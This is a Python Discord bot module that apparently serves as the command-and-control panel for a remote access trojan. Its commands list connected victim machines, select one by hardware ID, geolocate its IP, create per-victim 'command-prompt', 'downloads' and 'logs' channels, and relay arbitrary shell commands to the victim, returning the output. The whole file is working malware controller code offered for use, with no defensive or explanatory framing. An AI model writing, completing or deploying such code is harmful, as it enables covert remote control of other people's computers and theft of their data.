from time import time
from discord.ext import commands
from src.modules.socket_server import list_connections, get_target, target_info, send_target_commands, parse_target_ip

CONNECTED = []
HWID = []

help = {
        'commands': {
            'list' : ['-list', 'lists connected clients'],
            'select' : ['-select', 'select a client to interact with'],
            'cmd' : ['-cmd', 'send commands to selected client']
            }
        }


class Connections(commands.Cog):

    def __init__(self, bot):
        self.bot = bot
        

    @commands.command()
    async def list(self, ctx):
        try:
            connections = list_connections()
            await ctx.send(connections)
        except Exception:
            await ctx.send(f"[!] No clients connected")

    @commands.command()
    async def select(self, ctx, *, arg):
        global CONNECTED
        try:
            selection = arg
            conn = get_target(selection)
            CONNECTED = conn
            if CONNECTED is None:
                await ctx.send(f"[!] No connection made")
                return
            hwid, target_ip = target_info(conn)
            guild_categories = ctx.guild.categories
            if hwid not in str(guild_categories):
                target_ip_info = parse_target_ip(target_ip)
                new_category = await ctx.guild.create_category(hwid)
                category_id = new_category.id

                terminal_channel = await ctx.guild.create_text_channel(name='command-prompt', category=self.bot.get_channel(category_id))
                downloads_channel = await ctx.guild.create_text_channel(name='downloads', category=self.bot.get_channel(category_id))
                logs_channel = await ctx.guild.create_text_channel(name='logs', category=self.bot.get_channel(category_id))

                await logs_channel.send(f"{ctx.author.mention}\n[*] Connected to: {CONNECTED}\n IP: {target_ip_info}")
            else:
                await ctx.send(f"[*] Connected to: {CONNECTED}")
        except Exception:
            await ctx.send(f"[!] No clients connected")

    @commands.command()
    async def cmd(self, ctx, *, arg):
        global CONNECTED
        if CONNECTED is None:
            await ctx.send('[!] No connected client, select client before sending command')
            return
        else:
            cmd = arg
            conn = CONNECTED
            try:
                if cmd == 'exit':
                    await ctx.send(f"[!] Disconnected from {conn}")
                    CONNECTED = ''
                    return
                else:
                    client_response = send_target_commands(cmd, conn)
                    await ctx.send(f"{client_response}")
                    print(client_response, end="")
            except:
                await ctx.send(f"[!] No clients connected")


async def setup(bot):
    await bot.add_cog(Connections(bot))
